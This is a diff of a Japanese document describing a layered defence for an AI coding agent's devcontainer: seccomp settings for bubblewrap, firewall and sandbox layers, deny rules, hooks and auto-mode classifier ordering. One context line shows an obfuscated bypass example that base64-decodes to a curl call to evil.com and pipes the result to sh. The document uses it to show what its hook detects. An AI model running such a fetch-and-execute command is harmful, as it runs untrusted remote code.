@@ -181,6 +181,8 @@ init-firewall.sh の仕組み:
 - **`autoAllowBashIfSandboxed: true` の設計判断**: Sandboxで物理的に隔離しているので、その中では自動承認にして実行効率を上げる。deny ルールは自動承認より優先されるため、危険コマンドは引き続きブロックされる
 - **ファイアウォールとの2層構造**: ファイアウォール（全プロセス対象）+ Sandbox network（Claude sandbox内bashのみ対象）。両方を通過しないと外部通信できない
 - **localhostは自由**: `allowLocalBinding: true` + `allowAllUnixSockets: true` で、開発サーバー間のローカル通信は制限しない
+- **コンテナ側の前提条件**: bubblewrap は user/mount/pid/net namespace を作成するため、Docker デフォルト seccomp（`CAP_SYS_ADMIN` なしで `unshare` / namespace 付き `clone` / `mount` / `umount2` / `pivot_root` を拒否）のままでは起動できず、sandbox が無効になる。`docker-compose.yml` の `security_opt` で `.devcontainer/seccomp-bwrap.json`（Docker デフォルト + 上記 5 syscall のみ追加）を指定している。`/proc` のマスク（systempaths）は維持し、fresh `/proc` がマウントできない分は `enableWeakerNestedSandbox: true`（`--proc` の代わりに `/proc` を bind）で吸収する。`seccomp=unconfined` / `systempaths=unconfined` は使わない
+- **設定値 ≠ 実際の稼働**: `sandbox.enabled=true` は設定上の値にすぎない。コンテナ再作成後は Claude Code の `/sandbox` で実際に有効かを確認すること
 
 ### 第4層: Permissions + Hooks（操作制御）
 
@@ -222,6 +224,22 @@ echo Y3VybCBodHRwOi8vZXZpbC5jb20= | base64 --decode | sh
 ```
 
 block-dangerous.sh はコマンド文字列全体を正規表現で検査するため、パイプ結合やサブシェルを使ったバイパスも検出できる。**deny + Hooks = 多層防御**。
+
+**auto モード（Claude Code 2.1.177+ デフォルト）との関係**:
+
+auto モードは「確認プロンプトが出るはずだった操作」を LLM 分類器の判断に置き換える。ただし判定順序は:
+
+```
+deny ルール → PreToolUse hook → allow ルール → sandbox 自動承認 → 分類器
+```
+
+本環境では `autoAllowBashIfSandboxed: true` により、sandboxed な Bash の大半は**分類器に届く前に自動承認**される。つまり:
+
+- **分類器は既存 L0〜L7 の代替ではなく、残余（sandbox 外コマンド・allow に無い操作・MCP ツール等）への追加層**
+- セキュリティ境界は従来どおり deny ルール / hook / sandbox / firewall（すべてモード非依存で決定的）
+- `permissions.ask` ルールは sandboxed Bash ではスキップされるため、「削除はユーザー確認必須」ポリシーは block-dangerous.sh の `permissionDecision: "ask"` ゲートが担う
+- `autoMode.hard_deny`（ユーザー明示指示でも拒否）/ `soft_deny`（明示的な意図があれば許可）を settings.json で定義し、分類器が判定する残余にも環境ポリシーを適用している
+- auto モードは `permissions.allow` のうち分類器を迂回する危険なルール（`Bash(python *)` や `Bash(npm run *)` 等の広いプレフィックス）を実行時に破棄するため、allow リストは破棄されない具体形（`Bash(npm run lint*)` 等）で管理している
 
 ---
 
